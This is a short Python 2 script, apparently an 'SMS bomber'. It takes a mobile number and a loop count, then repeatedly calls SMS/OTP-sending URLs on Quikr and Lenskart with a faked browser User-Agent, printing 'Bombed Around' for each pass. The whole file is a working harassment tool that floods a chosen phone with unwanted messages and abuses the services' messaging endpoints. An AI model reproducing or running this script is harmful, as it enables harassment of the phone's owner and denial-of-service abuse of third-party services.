#!/usr/bin/python

import urllib2
num = raw_input("Enter Mobile Number \n")
if len(num) != 10:
	print "Run the Script again and.. \nEnter a 10 digit Mobile Number!! \n"
	exit();
op = int(raw_input("Enter a Number from 1-3 \n 1 for just dial \n 2 for Lenskart \n 3 for both Lenskart n Justdial \n"))
zero = 1
cntr = 0
if op == 1:
	url = "http://www.quikr.com/makeadpremiumsms?mob=%s&area=86&isBizMobile=true" %num
	req = urllib2.Request(url, headers={'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"}) 
	ctr = int(raw_input("Enter the loop \n"))
	while ctr >= zero:
		con = urllib2.urlopen(req)
		ctr =ctr-1
		cntr = cntr +1
		print "Bombed Around",cntr, "   :::   " , ctr , "Left"
elif op == 2:
	url1 = "http://offers.lenskart.com/sendopt.php?ph=%s&operation=start&ts=1376044348191" %num
	req1 = urllib2.Request(url1, headers={'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"}) 
	ctr = int(raw_input("Enter the loop \n"))
	while ctr >= zero:
		con = urllib2.urlopen(req1)
		ctr =ctr-1
		cntr = cntr +1
		print "Bombed Around",cntr, "   :::   " , ctr , "Left"
elif op == 3:
	url = "http://www.quikr.com/makeadpremiumsms?mob=%s&area=86&isBizMobile=true" %num
	req = urllib2.Request(url, headers={'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"}) 
	url1 = "http://offers.lenskart.com/sendopt.php?ph=%s&operation=start&ts=1376044348191" %num
	req1 = urllib2.Request(url1, headers={'User-Agent' : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Ubuntu/11.04 Chromium/12.0.742.112 Chrome/12.0.742.112 Safari/534.30"}) 
	ctr = int(raw_input("Enter the loop \n"))
	while ctr >= zero:
		con = urllib2.urlopen(req)
		con1 = urllib2.urlopen(req1)
		ctr =ctr-1
		cntr = cntr +1
		print "Bombed Around",cntr, "   :::   " , ctr , "Left"
	
else:
	print "Enter Number from 1 to 3"

        
